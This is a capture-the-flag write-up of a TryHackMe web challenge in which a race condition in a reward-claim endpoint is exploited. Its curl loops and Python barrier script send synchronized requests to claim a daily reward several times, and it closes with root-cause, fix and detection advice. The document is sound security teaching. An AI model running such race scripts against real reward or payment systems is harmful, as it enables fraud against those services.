# CTF Writeup — “Towel on the Sunbed”

### TryHackMe · Hacker Holidays Day 8 · Web · Medium · 90 Points

**Flag:** `THM{XXXXXXXX}`

---

## TL;DR

This challenge is built around a classic **race condition / TOCTOU vulnerability** in a reward system.

The application awards **50 PONZI once every 24 hours** and unlocks the **Whale Vault at 150 PONZI**. Normally, reaching 150 requires three successful claims over three days.

However, the server performs the eligibility check and records the claim separately. Because there is no lock between those operations, multiple requests can pass the eligibility check before the first request updates the user's claim timestamp.

By sending several requests **at the same time**, multiple claims can succeed within the same race window.

```text id="4v3g0y"
Guest Account
      │
      ▼
50 PONZI per claim
      │
      ▼
Whale Vault requires 150 PONZI
      │
      ▼
Find POST /claim
      │
      ▼
Naive parallel requests
      │
      ▼
Only one succeeds
      │
      ▼
Fresh account + synchronized requests
      │
      ▼
Multiple claims succeed
      │
      ▼
Balance ≥ 150
      │
      ▼
Whale Vault
      │
      ▼
FLAG
```

The core vulnerability is a **Time-of-Check to Time-of-Use (TOCTOU)** race condition.

---

# 1. Understanding the Race Condition

A race condition occurs when multiple operations interact with the same piece of state at nearly the same time, and the application fails to synchronize them correctly.

Imagine an ATM that allows one withdrawal per day.

The application might internally perform:

```text id="b3m6g1"
1. Check whether withdrawal is allowed
2. Give the money
3. Record that the withdrawal happened
```

Now imagine multiple ATMs checking the same account simultaneously.

If every ATM performs step 1 before any ATM reaches step 3, they can all see:

```text id="3c7h9y"
"Withdrawal allowed"
```

They all proceed.

The account can therefore be charged or paid multiple times before the system records the first transaction.

That gap between the **check** and the **update** is the vulnerability.

This is known as:

**TOCTOU — Time Of Check to Time Of Use**

---

# 2. Understanding the Challenge Mechanic

After registering a guest account, the dashboard explains the reward system.

The page states:

```html
<p class="staking-desc">
    Earn <strong>50 PONZI</strong> every 24 hours by claiming your staking reward.
</p>

<p class="vault-desc">
    Reach <strong>150 PONZI</strong> to unlock the Whale Vault
    and claim your exclusive reward.
</p>
```

This gives us:

* One claim = **50 PONZI**
* Claim cooldown = **24 hours**
* Whale Vault requirement = **150 PONZI**

The calculation is simple:

```text id="8n5r7m"
150 ÷ 50 = 3 claims
```

Legitimately, that means waiting three days.

The challenge is to collapse those three claims into a single request burst by exploiting the race condition.

---

# 3. Step 1 — Find the Claim Endpoint

The dashboard is controlled by JavaScript, so the actual API endpoint isn't necessarily obvious from the HTML.

Probe likely endpoints and identify the reward API.

The relevant endpoint is:

```text id="l7z4tc"
POST /claim
```

Using the session cookie:

```bash id="f1x5nb"
IP=10.146.147.180
C='connect.sid=<your-session-cookie>'

curl -s -b "$C" -X POST "http://$IP:3000/claim"
```

### What the options do

```text id="kjd0r5"
-s
```

Runs curl silently.

```text id="j5j9wm"
-b "$C"
```

Sends the session cookie so the server knows which account is making the request.

```text id="5g3v6j"
-X POST
```

Uses the POST method because the request modifies server-side state.

A successful response looks like:

```json id="d8o5dr"
{
    "message": "Staking reward claimed successfully.",
    "reward": 50,
    "newBalance": 50,
    "tier": "Shrimp",
    "priceSnapshot": 4.2
}
```

We now know that `/claim` grants **50 PONZI** and returns the new balance.

---

# 4. Step 2 — The First Race Attempt

The obvious idea is to send many requests simultaneously.

For example:

```bash id="4d1v1f"
for i in $(seq 1 30); do
  curl -s -b "$C" -X POST "http://$IP:3000/claim" >> race.txt &
done
wait

grep -c 'successfully' race.txt
```

The result is typically:

```text id="s6k2d7"
1
```

Only one request succeeds.

Why?

Because simply putting processes in the background doesn't guarantee that the requests arrive at exactly the same time.

Each curl process has its own connection setup and network overhead.

The requests may arrive something like:

```text id="e8v3p6"
Request 1 ──────►
Request 2      ──────►
Request 3           ──────►
Request 4                ──────►
```

By the time request #2 reaches the vulnerable section, request #1 may already have updated the claim timestamp.

Therefore, the remaining requests correctly receive the cooldown response.

---

# 5. Why Timing Matters

The vulnerability exists inside a very small window:

```text id="3x4m9h"
CHECK
  │
  │  ← vulnerable race window
  │
UPDATE
```

To exploit it successfully, multiple requests must reach the check before the first request performs the update.

Therefore:

> **Parallel is not necessarily simultaneous.**

Backgrounding multiple curl commands only makes them approximately concurrent.

We need much tighter synchronization.

---

# 6. Step 3 — Use a Fresh Account

There is another important detail.

The race must happen while the account is still eligible to claim.

If we already claimed normally, the account is now on the 24-hour cooldown:

```text id="8l2q9d"
Eligible = false
```

There is no useful race window left.

Therefore, create a **fresh guest account** and race its first claim.

A fresh account starts in the state:

```text id="7k6x3m"
Eligible = true
```

That gives all the concurrent requests a chance to pass the same eligibility check.

---

# 7. Step 4 — Synchronize the Requests

A better approach is to use Python threads and a `threading.Barrier`.

```python id="9v8m2c"
import requests
import threading

IP = "http://10.146.147.180:3000"
C = {"connect.sid": "<fresh-account-cookie>"}

N = 30

barrier = threading.Barrier(N)
results = []
lock = threading.Lock()

def claim():
    barrier.wait()

    r = requests.post(
        f"{IP}/claim",
        cookies=C
    )

    with lock:
        results.append(r.text)

threads = [
    threading.Thread(target=claim)
    for _ in range(N)
]

for t in threads:
    t.start()

for t in threads:
    t.join()

for r in sorted(set(results)):
    print(r)
```

Save it as:

```text id="1v8qk2"
race.py
```

Then run:

```bash id="6m0v1y"
python3 race.py
```

---

# 8. Why the Barrier Works

The important line is:

```python id="8x4k2p"
barrier = threading.Barrier(N)
```

Each thread prepares its request and then waits at:

```python id="n6c4t8"
barrier.wait()
```

The barrier stays closed until all threads reach it.

Once the final thread arrives, they are released together.

Conceptually:

```text id="j2p8q4"
Thread 1 ─┐
Thread 2 ─┤
Thread 3 ─┤
Thread 4 ─┤
   ...    ├──► BARRIER ──► FIRE
Thread 30 ┘
```

This dramatically reduces the spread between request arrivals.

Several requests can therefore reach the server while the reward is still considered claimable.

---

# 9. Step 5 — Win the Race

Run the script against the fresh account:

```bash id="c4n7mz"
python3 race.py
```

Instead of receiving only one successful response, multiple requests may succeed.

The returned balances can look like:

```text id="0w3r6k"
100
150
200
```

Each successful request adds another:

```text id="k9q2z7"
+50 PONZI
```

The important threshold is:

```text id="p8x3s5"
150 PONZI
```

Once the account reaches or exceeds 150 PONZI, the Whale Vault becomes available.

---

# 10. Alternative — Burp Suite

The challenge also mentions a Burp Suite approach.

Burp Repeater provides:

**Send group in parallel → Single-packet attack**

This is designed to send a group of requests with extremely tight timing.

The concept is the same:

```text id="r3x7n8"
Prepare requests
      ↓
Synchronize them
      ↓
Send together
      ↓
Hit the race window
```

The Python barrier approach provides a scriptable alternative.

---

# 11. Step 6 — Open the Whale Vault

Once the balance reaches:

```text id="9n6m4c"
≥ 150 PONZI
```

the Whale Vault unlocks.

The vault returns the challenge flag:

```text id="2h7q5s"
THM{XXXXXXXX}
```

### Flag

```text id="x4p8m2"
THM{XXXXXXXX}
```

The flag reflects the vulnerability perfectly: the same reward was effectively **spent multiple times** by exploiting the race window.

---

# 12. Root Cause

The vulnerable logic can be simplified to:

```text id="y7c2m4"
1. Read last_claim
2. Check whether 24 hours have passed
3. Perform processing
4. Add 50 to balance
5. Update last_claim
```

The problem is that there is no lock or atomic operation connecting the check and the update.

Conceptually:

```text id="n5v8x3"
Request A ── CHECK ───────── UPDATE
Request B ─────── CHECK ───────── UPDATE
Request C ───────── CHECK ───────── UPDATE
```

All three requests may observe the same old state.

Instead of:

```text id="g6r2m9"
Claim 1 → +50
Claim 2 → rejected
Claim 3 → rejected
```

we get:

```text id="d7k4p1"
Claim 1 → +50
Claim 2 → +50
Claim 3 → +50
```

The intended invariant is broken.

This is a classic **TOCTOU race condition**.

---

# 13. Defensive Takeaways

### Make the Check and Update Atomic

The eligibility check and state update should happen as one atomic database operation.

For example:

```sql
UPDATE users
SET
    last_claim = now(),
    balance = balance + 50
WHERE
    (now() - last_claim) >= interval '24h';
```

Then check the number of affected rows.

Only the first successful request should modify the record.

---

### Use Database Locks

A transaction can lock the user's record while checking and updating it.

For example:

```text id="f3m7w2"
SELECT ... FOR UPDATE
```

This forces concurrent claims to wait instead of operating on stale state.

---

### Use Idempotency Keys

State-changing requests can use idempotency keys so duplicate submissions are treated as a single operation.

---

### Rate Limit the Endpoint

Rate limiting can reduce the effectiveness of a burst attack.

However, rate limiting is **defense in depth** and does not fix the underlying race condition.

The business logic still needs to be atomic.

---

### Never Trust the UI

The interface may disable the **Claim** button after a successful claim.

That does not provide security.

An attacker can simply send HTTP requests directly to the API.

All business rules must be enforced server-side.

---

# 14. Detection Opportunities

### 1. Burst Requests

A large number of identical state-changing requests from one session within milliseconds can indicate a race attempt.

For example:

```text id="8w5c1p"
POST /claim
POST /claim
POST /claim
POST /claim
...
```

---

### 2. Impossible Balance Changes

If the reward is:

```text id="5k9r3t"
+50 every 24 hours
```

then a balance increase of:

```text id="4x8m2q"
+100
+150
+200
```

within a few seconds violates the business rule.

The server should detect and log these impossible state transitions.

---

### 3. Synchronized Request Patterns

Large groups of requests arriving within an extremely small time window can be detected at the proxy or load-balancer layer.

This can be especially useful for identifying automated race attempts.

---

# 15. Command Cheat Sheet

### Find the Claim Endpoint

```bash
curl -s -b "$C" -X POST "http://$IP:3000/claim"
```

### Naive Parallel Attempt

```bash
for i in $(seq 1 30); do
  curl -s -b "$C" -X POST "http://$IP:3000/claim" &
done
wait
```

This usually fails because the requests are not synchronized tightly enough.

### Winning Method

Use the synchronized Python barrier script:

```bash
python3 race.py
```

Then open the Whale Vault after reaching:

```text
150+ PONZI
```

---

# 16. Two Things Worth Remembering

### **1. Synchronize — don't just parallelize**

Running requests in the background does not guarantee that they arrive together.

A race condition requires the requests to overlap inside the vulnerable check-to-update window.

A synchronization barrier or Burp's single-packet attack provides much tighter timing.

---

### **2. Race the correct state**

A race only works while the condition being checked is still true.

After a successful claim, the account enters its cooldown period.

Therefore:

```text id="z6m3p8"
Fresh account
     ↓
Eligibility = TRUE
     ↓
Synchronize requests
     ↓
Multiple checks pass
     ↓
Multiple rewards
```

The fresh account is what gives the race an open window.

---

# Conclusion

“Towel on the Sunbed” demonstrates a classic **business-logic race condition**.

The intended flow is:

```text id="q5m8n2"
Claim
  ↓
Wait 24 hours
  ↓
Claim
  ↓
Wait 24 hours
  ↓
Claim
  ↓
150 PONZI
  ↓
Whale Vault
```

The vulnerable implementation allows us to change that into:

```text id="w4c7p9"
Fresh Account
     ↓
30 synchronized requests
     ↓
Multiple requests pass the same eligibility check
     ↓
50 + 50 + 50 ...
     ↓
150+ PONZI
     ↓
Whale Vault
     ↓
THM{XXXXXXXX}
```

The key lesson is simple:

> **Whenever an application performs a security or business-logic check and updates the related state separately, ask whether concurrent requests can slip through the gap.**

**Target and data are fictional TryHackMe challenge material; all actions described were performed against the room's provisioned machine.**
